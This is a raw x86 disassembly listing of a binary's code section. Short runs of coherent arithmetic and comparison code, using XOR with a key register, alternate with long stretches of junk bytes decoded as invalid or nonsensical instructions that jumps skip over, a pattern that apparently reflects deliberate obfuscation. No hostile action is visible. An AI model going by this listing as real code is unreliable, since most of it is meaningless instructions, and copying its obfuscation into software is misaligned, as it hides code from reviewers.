  402233:	or     dh,0x88
  402236:	ja     0x4022b4
  402238:	jl     0x4022ab
  40223a:	jg     0x4022b8
  40223c:	jl     0x4022a6
  40223e:	in     al,dx
  40223f:	imul   eax,DWORD PTR [ecx+eiz*8],0xffffffb2
  402243:	pop    edx
  402244:	inc    eax
  402245:	(bad)  
  402246:	mov    cl,0xe1
  402248:	mov    al,ds:0x8c112b97
  40224d:	sub    bl,BYTE PTR [eax+0x3815866]
  402253:	inc    BYTE PTR [edi+esi*4]
  402256:	(bad)  
  402257:	mov    ebp,0xa524767e
  40225c:	ret    
  40225d:	mov    fs,WORD PTR [eax+0x5701f7fe]
  402263:	outs   dx,BYTE PTR ds:[esi]
  402264:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402265:	jnp    0x402219
  402267:	ja     0x4022df
  402269:	scas   al,BYTE PTR es:[edi]
  40226a:	frndint 
  40226c:	xchg   esp,eax
  40226d:	nop
  40226e:	hlt    
  40226f:	fisttp QWORD PTR [ebx-0x1362e4a6]
  402275:	loop   0x4022ee
  402277:	mov    bh,0x46
  402279:	lds    ecx,FWORD PTR [ecx]
  40227b:	mov    DWORD PTR [esi-0x22],edx
  40227e:	(bad)  
  40227f:	call   0x8647:0x8f0f91a4
  402286:	xor    BYTE PTR [esi+0x2bb3873f],bh
  40228c:	inc    ebp
  40228d:	fist   WORD PTR [edi-0x28]
  402290:	(bad)  
  402291:	mov    esi,0x7ea00dd8
  402296:	xor    bh,0x11
  402299:	dec    ebx
  40229a:	sub    eax,0x2bc15528
  40229f:	iret   
  4022a0:	xor    ebx,DWORD PTR [eax-0x6]
  4022a3:	xchg   ebx,eax
  4022a4:	repz aaa 
  4022a6:	aad    0xc4
  4022a8:	xor    edx,DWORD PTR [edx-0x44]
  4022ab:	adc    edx,DWORD PTR [ecx+0x38]
  4022ae:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4022af:	(bad)  
  4022b0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4022b1:	mov    WORD PTR [edi],es
  4022b3:	cmp    eax,0x859c5b7d
  4022b8:	cld    
  4022b9:	sahf   
  4022ba:	and    eax,0xe6df7817
  4022bf:	cmc    
  4022c0:	ins    BYTE PTR es:[edi],dx
  4022c1:	out    dx,eax
  4022c2:	fidiv  WORD PTR [ecx-0x304af1e1]
  4022c8:	cmp    dl,bh
  4022ca:	mov    dl,0x11
  4022cc:	mov    dl,0x8
  4022ce:	dec    esi
  4022cf:	adc    al,0xc7
  4022d1:	pop    edi
  4022d2:	or     BYTE PTR [ebp-0xf],dh
  4022d5:	mov    esp,0xfee9c38b
  4022da:	cmp    eax,0xa0b5b4c8
  4022df:	add    DWORD PTR [ebp-0x7f],edx
  4022e2:	shr    DWORD PTR [edi],1
  4022e4:	pop    eax
  4022e5:	add    bl,BYTE PTR ds:0x2b05e743
  4022eb:	pop    ss
  4022ec:	mov    ds:0x4e6f6237,eax
  4022f1:	and    DWORD PTR [ecx+0x6de51a91],0xd5e7d204
  4022fb:	jbe    0x402373
  4022fd:	fidivr DWORD PTR [esi+0x424b5376]
  402303:	sub    BYTE PTR [esi-0x6f0d27b7],0xfd
  40230a:	scas   eax,DWORD PTR es:[edi]
  40230b:	out    dx,al
  40230c:	les    eax,FWORD PTR [esi]
  40230e:	xchg   BYTE PTR [eax],ah
  402310:	cmp    edx,DWORD PTR [ecx]
  402312:	test   DWORD PTR [edi+ecx*8+0x3d],ebp
  402316:	jnp    0x402309
  402318:	mov    ch,0xd8
  40231a:	mov    ch,0xae
  40231c:	shl    eax,cl
  40231e:	jp     0x4022f7
  402320:	repz push cs
  402322:	add    DWORD PTR [ecx-0x6a],edi
  402325:	mov    cl,0x69
  402327:	push   ebx
  402328:	outs   dx,DWORD PTR ds:[esi]
  402329:	rcl    ch,1
  40232b:	adc    al,0x69
  40232d:	sub    al,0x4e
  40232f:	dec    ebx
  402330:	shl    dl,1
  402332:	leave  
  402333:	ret    
  402334:	mov    dh,0x2d
  402336:	jg     0x40235e
  402338:	loop   0x4023a1
  40233a:	lock or BYTE PTR ds:0x8b414036,dh
  402341:	jge    0x40233f
  402343:	xor    edx,eax
  402345:	not    ebx
  402347:	xor    edi,eax
  402349:	mov    ebx,DWORD PTR ds:0x4292bd
  40234f:	add    ebx,DWORD PTR ds:0x427cf7
  402355:	mov    DWORD PTR ds:0x4292bd,ebx
  40235b:	add    edi,ecx
  40235d:	movzx  ebx,WORD PTR ds:0x427598
  402364:	or     ebx,DWORD PTR ds:0x42c892
  40236a:	mov    DWORD PTR ds:0x427598,ebx
  402370:	add    edx,ecx
  402372:	imul   edx,edi
  402375:	mov    ebx,DWORD PTR ds:0x4292d5
  40237b:	sbb    DWORD PTR ds:0x427d0f,ebx
  402381:	mov    edi,DWORD PTR [ebp-0x8]
  402384:	mov    ebx,DWORD PTR [ebp-0x10]
  402387:	sbb    DWORD PTR ds:0x4292a1,0x3598
  402391:	sub    ebx,edi
  402393:	mov    DWORD PTR ds:0x427d13,0x71c6
  40239d:	cmp    ebx,edx
  40239f:	mov    DWORD PTR ds:0x42759c,0x6366
  4023a9:	ja     0x4023ce
  4023af:	movzx  edx,WORD PTR ds:0x4292d9
  4023b6:	xor    edx,DWORD PTR ds:0x4292a9
  4023bc:	mov    DWORD PTR ds:0x4292d9,edx
  4023c2:	mov    edx,DWORD PTR [ebp-0x4]
  4023c5:	xor    edx,eax
  4023c7:	add    edx,ecx
  4023c9:	jmp    0x402807
  4023ce:	mov    edx,DWORD PTR [ebp-0x2c]
  4023d1:	mov    edi,DWORD PTR [ebp-0x4]
  4023d4:	xor    edx,eax
  4023d6:	xor    edi,eax
  4023d8:	add    edi,ecx
  4023da:	add    edx,ecx
  4023dc:	imul   edx,edi
  4023df:	mov    edi,DWORD PTR [ebp-0x8]
  4023e2:	mov    ebx,DWORD PTR [ebp-0x10]
  4023e5:	sub    ebx,edi
  4023e7:	cmp    ebx,edx
  4023e9:	ja     0x4023f7
  4023ef:	mov    edx,DWORD PTR [ebp-0x28]
  4023f2:	jmp    0x4027f9
  4023f7:	mov    edx,DWORD PTR [ebp-0x30]
  4023fa:	mov    edi,DWORD PTR [ebp-0x4]
  4023fd:	xor    edx,eax
  4023ff:	xor    edi,eax
  402401:	add    edi,ecx
  402403:	add    edx,ecx
  402405:	imul   edx,edi
  402408:	mov    edi,DWORD PTR [ebp-0x8]
  40240b:	mov    ebx,DWORD PTR [ebp-0x10]
  40240e:	sub    ebx,edi
  402410:	cmp    ebx,edx
  402412:	ja     0x402420
  402418:	mov    edx,DWORD PTR [ebp-0x2c]
  40241b:	jmp    0x4027f9
  402420:	mov    edx,DWORD PTR [ebp-0x34]
  402423:	mov    edi,DWORD PTR [ebp-0x4]
  402426:	xor    edx,eax
  402428:	xor    edi,eax
  40242a:	add    edi,ecx
  40242c:	add    edx,ecx
  40242e:	imul   edx,edi
  402431:	mov    edi,DWORD PTR [ebp-0x8]
  402434:	jmp    0x402554
  402439:	ret    
  40243a:	fwait
  40243b:	dec    ebp
  40243c:	int    0x4d
  40243e:	fld    QWORD PTR [ebx-0x63]
  402441:	out    0xff,al
  402443:	loop   0x4024a4
  402445:	pop    ss
  402446:	push   ds
  402447:	test   DWORD PTR [eax],edx
  402449:	lea    esi,[esi+0x7c]
  40244c:	jl     0x4024bf
  40244e:	jg     0x4024cc
  402450:	jl     0x4024cc
  402452:	cmp    al,0xf1
  402454:	or     al,0x35
  402456:	wrmsr  
  402458:	dec    ebp
  402459:	lock cdq 
  40245b:	add    BYTE PTR [edx],al
  40245d:	add    BYTE PTR [esi+0x68],ah
  402460:	cmp    BYTE PTR [esi-0x2f],cl
  402463:	cdq    
  402464:	xor    eax,0x41a31397
  402469:	cli    
  40246a:	cs ror bl,1
  40246d:	mov    bh,0xec
  40246f:	push   ecx
  402470:	jnp    0x4024b9
  402472:	inc    ebx
  402473:	add    BYTE PTR [eax-0x24],0xe0
  402477:	test   al,0x61
  402479:	sub    DWORD PTR [eax],ebp
  40247b:	sti    
  40247c:	sbb    BYTE PTR [ebp-0x15f32510],dh
  402482:	add    BYTE PTR [ebp+0x252c2fed],bh
  402488:	ds cmc 
  40248a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40248b:	stos   DWORD PTR es:[edi],eax
  40248c:	xchg   DWORD PTR [esi],edx
  40248e:	paddb  mm5,QWORD PTR [ecx-0x3c153d97]
  402495:	dec    esi
  402496:	mov    ds:0x20592b01,eax
  40249b:	pop    es
  40249c:	lahf   
  40249d:	scas   al,BYTE PTR es:[edi]
  40249e:	add    ebx,DWORD PTR [ecx-0x6da1a3af]
  4024a4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4024a5:	or     eax,ecx
  4024a7:	inc    eax
  4024a8:	fcmovbe st,st(2)
  4024aa:	jp     0x4024e1
  4024ac:	fs sbb dh,0x15
  4024b0:	push   0xe46ef8e
  4024b5:	fsub   DWORD PTR [ebp+0x3c24e876]
  4024bb:	fistp  QWORD PTR [ebx-0x337d0c87]
  4024c1:	jne    0x4024da
  4024c3:	aas    
  4024c4:	dec    edi
  4024c5:	loope  0x402512
  4024c7:	adc    BYTE PTR [edi-0xdbfe1dc],0x2a
  4024ce:	cmp    dh,BYTE PTR [edx-0x79]
  4024d1:	push   0xffffff9c
  4024d3:	jp     0x4024db
  4024d5:	mov    bl,0xbb
  4024d7:	push   ds
  4024d8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4024d9:	push   esp
  4024da:	inc    esi
  4024db:	dec    ecx
  4024dc:	jno    0x40251a
  4024de:	or     DWORD PTR fs:[esi],ebx
  4024e1:	or     ch,bh
  4024e3:	icebp  
  4024e4:	sbb    ebp,DWORD PTR ds:0x4aa802fb
  4024ea:	mov    ecx,0x76ae7b55
  4024ef:	sub    BYTE PTR [edi-0x3e],0x4b
  4024f3:	add    eax,0xc1dd2a15
  4024f8:	jecxz  0x4024cf
  4024fa:	xor    DWORD PTR [esi],eax
  4024fc:	sbb    al,0x6
  4024fe:	mov    BYTE PTR [esi-0x55],0x40
  402502:	mov    BYTE PTR [esi],dh
  402504:	mov    dl,0xb6
  402506:	xchg   BYTE PTR [ebx-0x75],dl
  402509:	jmp    0x426b:0x73f02ac
  402510:	daa    
  402511:	and    al,0x25
  402513:	mov    esi,0x923999cf
  402518:	pop    ss
  402519:	cmp    dl,dl
  40251b:	mov    eax,ds:0x695bc952
  402520:	enter  0xaa67,0x0
  402524:	xor    bl,BYTE PTR [edi-0x66]
  402527:	push   ss
  402528:	or     eax,0x99660ad3
  40252d:	jbe    0x402545
  40252f:	mov    bh,0x49
  402531:	mov    DWORD PTR [esi-0x51],ecx
  402534:	fs aam 0xf6
  402537:	jmp    0x3d7915d4
  40253c:	xor    DWORD PTR [esi+0xd76dc3a],0xa12ca5f8
  402546:	aas    
  402547:	cmp    DWORD PTR [edx+ebx*4+0x419bc8c1],eax
  40254e:	push   0x764718d6
  402553:	(bad)  
  402554:	mov    ebx,DWORD PTR [ebp-0x10]
  402557:	sub    ebx,edi
  402559:	cmp    ebx,edx
  40255b:	ja     0x402569
  402561:	mov    edx,DWORD PTR [ebp-0x30]
  402564:	jmp    0x4027f9
  402569:	mov    edx,DWORD PTR [ebp-0x38]
  40256c:	mov    edi,DWORD PTR [ebp-0x4]
  40256f:	xor    edx,eax
  402571:	xor    edi,eax
  402573:	add    edi,ecx
  402575:	add    edx,ecx
  402577:	imul   edx,edi
  40257a:	mov    edi,DWORD PTR [ebp-0x8]
  40257d:	mov    ebx,DWORD PTR [ebp-0x10]
  402580:	sub    ebx,edi
  402582:	cmp    ebx,edx
  402584:	ja     0x402592
  40258a:	mov    edx,DWORD PTR [ebp-0x34]
  40258d:	jmp    0x4027f9
  402592:	mov    edx,DWORD PTR [ebp-0x3c]
  402595:	mov    edi,DWORD PTR [ebp-0x4]
  402598:	xor    edx,eax
  40259a:	xor    edi,eax
  40259c:	add    edx,ecx
  40259e:	add    edi,ecx
  4025a0:	jmp    0x4026c0
  4025a5:	push   ds
  4025a6:	in     al,0x25
  4025a8:	pop    es
  4025a9:	std    
  4025aa:	(bad)  [edx]
  4025ac:	stc    
  4025ad:	dec    edx
  4025ae:	mov    WORD PTR [ebp-0x45],?
  4025b1:	popf   
  4025b2:	fwait
  4025b3:	mov    dl,0x29
  4025b5:	mov    cs,WORD PTR [ecx]
  4025b7:	jl     0x402635
  4025b9:	jno    0x40263a
  4025bb:	jl     0x402639
  4025bd:	mov    esp,0x95befe75
  4025c2:	dec    edi
  4025c3:	add    esp,esi
  4025c5:	push   edi
  4025c6:	mov    ebp,0x2709f5f0
  4025cb:	imul   esi,ecx,0x77
  4025ce:	aaa    
  4025cf:	jae    0x40262c
  4025d1:	ficomp DWORD PTR ds:0x74fd8ac3
  4025d7:	pop    eax
  4025d8:	jo     0x4025be
  4025da:	in     al,dx
  4025db:	mov    bl,BYTE PTR [edx-0x5cc15580]
  4025e1:	ins    DWORD PTR es:[edi],dx
  4025e2:	pop    edi
  4025e3:	mov    dl,0xaf
  4025e5:	and    al,0xf3
  4025e7:	ret    0x1ba6
  4025ea:	mov    ch,0x59
  4025ec:	mov    ch,0xf2
  4025ee:	dec    eax
  4025ef:	js     0xd0683b4e
  4025f5:	mov    edi,0xe750425f
  4025fa:	or     DWORD PTR [eax-0x19],ebx
  4025fd:	jno    0x40260c
  4025ff:	shl    DWORD PTR [ebx+0x595b4a59],cl
  402605:	xor    eax,esi
  402607:	sahf   
  402608:	call   0x55de:0x5b91db16
  40260f:	int3   
  402610:	lahf   
  402611:	add    esp,DWORD PTR [esi]
  402613:	push   es
  402614:	scas   al,BYTE PTR es:[edi]
  402615:	jae    0x4025d4
  402617:	lods   eax,DWORD PTR ds:[esi]
  402618:	in     eax,dx
  402619:	mov    esi,0x102860d5
  40261e:	add    DWORD PTR [esi-0x46],0x2c31bde9
  402625:	sub    DWORD PTR [edi],esi
  402627:	icebp  
  402628:	rcr    esp,cl
  40262a:	inc    esi
  40262b:	xor    bl,dh
  40262d:	push   ecx
  40262e:	mov    edx,DWORD PTR [edx+0x22]
  402631:	out    0x55,eax
  402633:	fmul   QWORD PTR [edx+0x30]
  402636:	push   es
  402637:	mov    ds:0xb759690d,eax
  40263c:	jecxz  0x40261c
  40263e:	and    bl,ch
  402640:	pop    ecx
  402641:	test   al,0xea
  402643:	in     eax,0x53
  402645:	jp     0x40267b
  402647:	xor    eax,DWORD PTR [ecx+0x739d2391]
  40264d:	lods   al,BYTE PTR ds:[esi]
  40264e:	clc    
  40264f:	retf   0xe3e4
  402652:	jne    0x4025f9
  402654:	cmp    DWORD PTR [edi+edx*4+0x49],eax
  402658:	retf   
  402659:	add    eax,DWORD PTR [edi-0x54160921]
  40265f:	retf   0xc2
  402662:	add    ebx,DWORD PTR ds:0x4bb44316
  402668:	and    al,0x91
  40266a:	pop    esp
  40266b:	lock or ebx,esi
  40266e:	gs int 0xd2
  402671:	(bad)  
  402672:	sub    edx,edi
  402674:	fiadd  DWORD PTR [ebp+esi*2-0x58]
  402678:	stos   DWORD PTR es:[edi],eax
  402679:	iret   
  40267a:	jmp    0xdd6c6028
  40267f:	popf   
  402680:	xchg   esp,eax
  402681:	lock fistp QWORD PTR [eax+edi*1]
  402685:	fadd   QWORD PTR [ebx]
  402687:	xchg   ecx,eax
  402688:	in     eax,dx
  402689:	xchg   DWORD PTR [ecx-0x43a8d0aa],edi
  40268f:	(bad)  
  402690:	into   
  402691:	pop    edi
  402692:	jmp    0x6fb7:0x97761253
  402699:	push   ecx
  40269a:	je     0x4026e2
  40269c:	sahf   
  40269d:	es es data16 (bad) 
  4026a1:	into   
  4026a2:	(bad)  
  4026a3:	mov    DWORD PTR [ebp-0x44],0x11dd247d
  4026aa:	imul   ebx,DWORD PTR [ebx+0x379d9fa6],0xcf4cec40
  4026b4:	inc    ebx
  4026b5:	push   edi
  4026b6:	outs   dx,BYTE PTR ds:[esi]
  4026b7:	fbstp  TBYTE PTR [edi]
  4026b9:	stos   BYTE PTR es:[edi],al
  4026ba:	shl    BYTE PTR [ecx+esi*8+0xf4e3b3b],cl
  4026c1:	scas   eax,DWORD PTR es:[edi]
  4026c2:	xlat   BYTE PTR ds:[ebx]
  4026c3:	mov    edi,DWORD PTR [ebp-0x8]
  4026c6:	jmp    0x4027e6
  4026cb:	test   eax,0x4dcf8b5f
  4026d0:	sti    
  4026d1:	jge    0x40274c
  4026d3:	test   BYTE PTR [ebx],0x46
  4026d6:	adc    eax,0x557128e7
  4026db:	or     DWORD PTR [eax],0x7c
  4026de:	jl     0x402751
  4026e0:	jg     0x40275e
  4026e2:	jl     0x4026f1
  4026e4:	cld    
  4026e5:	cld    
  4026e6:	lds    edi,FWORD PTR [ecx+0x2d29c1e7]
  4026ec:	fidiv  DWORD PTR [ecx+edi*2]
  4026ef:	fldenv [edi+0x68279bf6]
  4026f5:	mov    ebp,0x15ab601d
  4026fa:	and    esi,DWORD PTR [eax]
  4026fc:	xchg   edx,eax
  4026fd:	dec    ebp
  4026fe:	in     eax,0x27
  402700:	xchg   edx,eax
  402701:	jmp    0xf1d1:0xeedaac73
  402708:	cmp    ch,dl
  40270a:	jg     0x402771
  40270c:	mov    ds:0xacd2a44d,eax
  402711:	dec    ebp
  402712:	xor    ecx,ebp
  402714:	inc    ecx
  402715:	and    ah,BYTE PTR [eax-0x3b2f94fb]
  40271b:	inc    esp
  40271c:	loopne 0x402738
  40271e:	cmp    ebx,DWORD PTR [ebx-0x73]
  402721:	rep outs dx,BYTE PTR ds:[esi]
  402723:	or     DWORD PTR [edx+0x1063062e],ebp
  402729:	test   BYTE PTR [ecx+0x38d43384],cl
  40272f:	call   0x4276aad7
  402734:	xchg   edi,edx
  402736:	pop    ebp
  402737:	repnz mov dl,0xfd
  40273a:	aas    
  40273b:	cmp    ah,BYTE PTR [ebp+0x51]
  40273e:	cmp    eax,0x5e412cfc
  402743:	mul    DWORD PTR [edx+0x1b]
  402746:	cmp    al,0xe9
  402748:	popa   
  402749:	fsubr  QWORD PTR [edx+0x33dc9c4c]
  40274f:	in     al,dx
  402750:	push   ecx
  402751:	sub    ebx,edx
  402753:	push   ss
  402754:	jbe    0x40275b
  402756:	cmp    al,BYTE PTR [edx+0x63029b1c]
  40275c:	addr16 jg 0x402702
  40275f:	icebp  
  402760:	aas    
  402761:	(bad)  
  402762:	mov    edi,0x6a1353db
  402767:	hlt    
  402768:	out    dx,al
  402769:	push   edi
  40276a:	rol    DWORD PTR [edi],0x37
  40276d:	in     al,dx
  40276e:	push   ecx
  40276f:	jns    0x402779
  402771:	jg     0x4027cc
  402773:	dec    edi
  402774:	mov    esp,0x53a8b31e
  402779:	dec    ecx
  40277a:	sbb    DWORD PTR [ecx-0x38a14092],edi
  402780:	sub    bh,BYTE PTR [ebp+0x12]
  402783:	add    BYTE PTR [edx+0x6c4c4398],bh
  402789:	test   eax,0x858e622f
  40278e:	sub    DWORD PTR [esi-0x423dbcef],ebp
  402794:	js     0x402790
  402796:	or     al,0xa7
  402798:	push   esi
  402799:	sbb    DWORD PTR [ecx-0x5f],0xc00de671
  4027a0:	pop    ds
  4027a1:	dec    esp
  4027a2:	bound  eax,QWORD PTR [ebx+0x6929202a]
  4027a8:	xchg   edi,eax
  4027a9:	mov    bh,0x45
  4027ab:	fbld   TBYTE PTR [edx]
  4027ad:	xchg   BYTE PTR [esi-0x21],ah
  4027b0:	xor    ebx,edx
  4027b2:	pop    esi
  4027b3:	jae    0x4027da
  4027b5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4027b6:	or     eax,0xb6971d13
  4027bb:	mov    ecx,0xbcc6933f
  4027c0:	jmp    DWORD PTR [ecx+eax*4]
  4027c3:	test   BYTE PTR [edi+esi*2-0x48],cl
  4027c7:	xor    DWORD PTR [ecx-0x1c01fb9f],ebp
  4027cd:	mov    DWORD PTR [ebx],0xf6849ec9
  4027d3:	cld    
  4027d4:	or     ch,dl
  4027d6:	or     ah,dl
  4027d8:	popf   
  4027d9:	call   0x7d892e54
  4027de:	mov    al,0xb
  4027e0:	jnp    0x4027dd
  4027e2:	xchg   ebx,eax
  4027e3:	aam    0x84
  4027e5:	mov    DWORD PTR [ebx-0x20d40fa3],ecx
  4027eb:	cmp    ebx,edx
  4027ed:	mov    edx,DWORD PTR [ebp-0x38]
  4027f0:	jbe    0x4027f9
  4027f6:	mov    edx,DWORD PTR [ebp-0x3c]
  4027f9:	mov    edi,DWORD PTR [ebp-0x4]
  4027fc:	xor    edi,eax
  4027fe:	xor    edx,eax
  402800:	add    edi,ecx
  402802:	add    edx,ecx
  402804:	imul   edx,edi
  402807:	mov    DWORD PTR [ebp+0xc],edx
  40280a:	mov    edx,DWORD PTR [ebp+0xc]
  40280d:	mov    DWORD PTR [ebp-0x24],edx
  402810:	mov    edx,DWORD PTR [ebp-0x8]
  402813:	add    edx,DWORD PTR [ebp-0x40]
  402816:	jmp    0x402936
  40281b:	push   esp
  40281c:	in     al,dx
  40281d:	dec    ebx
  40281e:	dec    ebp
  40281f:	pop    ebx
  402820:	jge    0x402878
  402822:	in     eax,0xc9
  402824:	std    
  402825:	ja     0x402846
  402827:	add    DWORD PTR [ebp-0x72],eax
  40282a:	add    BYTE PTR [ebx+ecx*1+0x7f717c7c],al
  402831:	jl     0x4028af
  402833:	test   eax,0x599a6ae
  402838:	cli    
  402839:	sub    al,0x6b
  40283b:	mov    dl,0x77
  40283d:	mov    ebx,0xb21d695c
  402842:	mov    eax,ds:0x399c7add
  402847:	jmp    0x6fc8:0x165ca926
  40284e:	pop    ecx
  40284f:	or     al,0x5
  402851:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402852:	mov    esp,DWORD PTR [edi+0x32]
  402855:	(bad)  
  402856:	jl     0x40282a
  402858:	pop    ecx
  402859:	or     DWORD PTR [edi+0x2c],ebp
  40285c:	mov    BYTE PTR [ecx+0x6fcca6f9],dl
  402862:	xchg   ebp,eax
  402863:	dec    edi
  402864:	dec    ebx
  402865:	sub    ch,BYTE PTR [esi-0x553b80d0]
  40286b:	(bad)  
  40286c:	mov    eax,ds:0xac306a4a
  402871:	idiv   esi
  402873:	add    cl,BYTE PTR [esi-0xdd0ac33]
  402879:	loopne 0x402837
  40287b:	or     eax,0xeac8e9a6
  402880:	pop    ecx
  402881:	pop    ecx
  402882:	sbb    BYTE PTR [ebx-0x7d193cdf],bh
  402888:	pop    edi
  402889:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40288a:	push   ds
  40288b:	mov    esp,0xbcbcd9ee
  402890:	xor    ebx,DWORD PTR [ebx+0x76]
  402893:	dec    esi
  402894:	mov    dl,0x67
  402896:	jne    0x4028a3
  402898:	repnz (bad) 
  40289a:	mov    al,ds:0xdc4f6b09
  40289f:	sub    eax,0x866eb4f7
  4028a4:	cwde   
  4028a5:	leave  
  4028a6:	jp     0x402869
  4028a8:	sbb    BYTE PTR [eax+0x2],cl
  4028ab:	mov    ecx,0x302da98c
  4028b0:	aad    0x96
  4028b2:	push   ds
  4028b3:	bound  esi,QWORD PTR [esi-0x3e0263fb]
  4028b9:	push   ebp
  4028ba:	xchg   DWORD PTR [esp+ebx*2+0x50d80a1b],esi
  4028c1:	mov    DWORD PTR [ebx],ebx
  4028c3:	mov    ebp,0xfa3d9594
  4028c8:	stos   BYTE PTR es:[edi],al
  4028c9:	add    BYTE PTR [eax-0x14b80038],0x31
  4028d0:	das    
  4028d1:	adc    DWORD PTR [ebp-0x12],esp
  4028d4:	pop    esi
  4028d5:	mov    esi,0x34a78c43
  4028da:	sub    BYTE PTR [esi-0x6bb85bcd],dh
  4028e0:	mov    ecx,0x331ad3ef
  4028e5:	dec    edx
  4028e6:	mov    ds:0x27e1d3,eax
  4028eb:	pop    edi
  4028ec:	enter  0x65c2,0x6c
  4028f0:	daa    
  4028f1:	scas   eax,DWORD PTR es:[edi]
  4028f2:	fs mov bl,0x73
  4028f5:	xor    DWORD PTR [ecx+0x350450c2],esi
  4028fb:	fs or  eax,0x89f68741
  402901:	test   edx,edi
  402903:	or     al,0xd7
  402905:	sbb    bl,BYTE PTR [eax]
  402907:	(bad)  
  402909:	cmp    esp,DWORD PTR [ebp-0x53]
  40290c:	gs or  ah,bl
  40290f:	or     DWORD PTR [esi+0x32],edi
  402912:	dec    esp
  402913:	or     al,0x6
  402915:	add    al,0x9
  402917:	xor    eax,DWORD PTR ds:0x40bc3e2c
  40291d:	daa    
  40291e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40291f:	mov    dh,0x43
  402921:	dec    eax
  402922:	outs   dx,BYTE PTR ds:[esi]
  402923:	mov    eax,ds:0xb7f2d71f
  402928:	cmp    BYTE PTR [edx+0x29],ch
  40292b:	adc    ah,BYTE PTR [ecx]
  40292d:	test   al,0x55
  40292f:	adc    edi,DWORD PTR [eax+0x42]
  402932:	push   edx
  402933:	add    ebp,esp
  402935:	mov    ds:0x35e845c7,eax
  40293a:	test   DWORD PTR [eax+edi*8-0x381baa77],ebx
  402941:	inc    ebp
  402942:	hlt    
  402943:	xor    al,0x85
  402945:	pushf  
  402946:	clc    
  402947:	mov    DWORD PTR [ebp-0x44],0xf89c8533
  40294e:	mov    edx,DWORD PTR [ebp-0x18]
  402951:	xor    edx,eax
  402953:	add    edx,ecx
  402955:	jmp    0x402ae2
  40295a:	mov    edx,DWORD PTR [ebp-0x18]
  40295d:	xor    edx,eax
  40295f:	add    edx,DWORD PTR [ebp-0x14]
  402962:	mov    edi,DWORD PTR [ebp-0x1c]
  402965:	mov    dl,BYTE PTR [edx+edi*1+0x32729e]
  40296c:	mov    BYTE PTR [ebp+0xf],dl
  40296f:	mov    edx,DWORD PTR [ebp-0xc]
  402972:	xor    edx,eax
  402974:	add    edx,DWORD PTR [ebp-0x14]
  402977:	mov    edi,DWORD PTR [ebp-0x1c]
  40297a:	mov    dl,BYTE PTR [edx+edi*1+0x32729e]
  402981:	mov    BYTE PTR [ebp+0xb],dl
  402984:	mov    dl,BYTE PTR [ebp+0xf]
  402987:	mov    edi,DWORD PTR [ebp-0xc]
  40298a:	jmp    0x402aaa
  40298f:	inc    eax
  402990:	(bad)
  402993:	imul   edi,DWORD PTR [edx+0x43],0x97beacfd
  40299a:	jno    0x4029fd
  40299c:	(bad)  
  40299d:	arpl   sp,di
  40299f:	cdq    
  4029a0:	or     bh,BYTE PTR [esp+edi*2+0x71]
  4029a4:	jg     0x402a22
  4029a6:	jl     0x40294b
  4029a8:	pop    esp
  4029a9:	addr16 data16 adc al,0x8d
  4029ad:	dec    ecx
  4029ae:	cdq    
  4029af:	sub    al,0x78
  4029b1:	ins    BYTE PTR es:[edi],dx
  4029b2:	or     ah,BYTE PTR [ecx]
  4029b4:	out    0x91,al
  4029b6:	xchg   DWORD PTR ds:0xcaf299f2,ebx
  4029bc:	mov    al,BYTE PTR [eax+eiz*2-0x4d00769e]
  4029c3:	xlat   BYTE PTR ds:[ebx]
  4029c4:	ror    dh,cl
  4029c6:	xchg   ecx,eax
  4029c7:	sub    ecx,DWORD PTR [ebx-0x4083260b]
  4029cd:	ja     0x4029c4
  4029cf:	retf   
  4029d0:	lea    edx,[edx]
  4029d2:	ret    0x7b31
  4029d5:	lock mov WORD PTR [edx+0x2fbd5664],?
  4029dc:	ror    DWORD PTR [ebx],0x67
  4029df:	jecxz  0x402a11
  4029e1:	jl     0x402a0a
  4029e3:	mov    ebp,0x8bbefe66
  4029e8:	inc    ebx
  4029e9:	mov    dh,0x8c
  4029eb:	dec    ebp
  4029ec:	cmp    DWORD PTR [eax-0x63ea7419],0xea39af15
  4029f6:	xchg   ah,cl
  4029f8:	fist   WORD PTR [edi+0x5f7af070]
  4029fe:	and    BYTE PTR [ebx],ch
  402a00:	sub    DWORD PTR [ecx],eax
  402a02:	(bad)  
  402a03:	in     al,dx
  402a04:	into   
  402a05:	pop    es
  402a06:	arpl   WORD PTR [ebx],bp
  402a08:	je     0x4029eb
  402a0a:	inc    esi
  402a0b:	lea    ebp,[eax]
  402a0d:	rol    DWORD PTR [edi+0x41],cl
  402a10:	or     al,bh
  402a12:	int    0x7e
  402a14:	les    ebp,FWORD PTR [edx-0x3576bfa]
  402a1a:	sbb    bh,dh
  402a1c:	jle    0x402a14
  402a1e:	(bad)  
  402a1f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402a20:	mov    ah,0x52
  402a22:	mov    bh,BYTE PTR [ebp+0x9]
  402a25:	or     al,0xd
  402a27:	cdq    
  402a28:	xor    al,dl
  402a2a:	add    ebx,DWORD PTR [ebp+0x4701e22b]
  402a30:	or     dl,cl
  402a32:	cmp    eax,0x10f180e3
  402a37:	sbb    dh,cl
  402a39:	cdq    
  402a3a:	dec    ecx
  402a3b:	inc    ebp
  402a3c:	sub    eax,0x96d6d526
  402a41:	scas   eax,DWORD PTR es:[edi]
  402a42:	loopne 0x402aad
  402a44:	dec    esi
  402a45:	add    eax,DWORD PTR [eax]
  402a47:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402a48:	add    al,0x12
  402a4a:	and    ah,bl
  402a4c:	mov    bh,0x82
  402a4e:	fwait
  402a4f:	ss int3 
  402a51:	cmp    edi,DWORD PTR [esi]
  402a53:	cmp    BYTE PTR ds:[esi+0x16],0xb0
  402a58:	push   esp
  402a59:	push   0x774471cc
  402a5e:	mov    ah,0x57
  402a60:	pop    esp
  402a61:	fmul   DWORD PTR [ebx]
  402a63:	pop    ebp
  402a64:	outs   dx,DWORD PTR ds:[esi]
  402a65:	adc    BYTE PTR ds:[esi],bh
  402a68:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
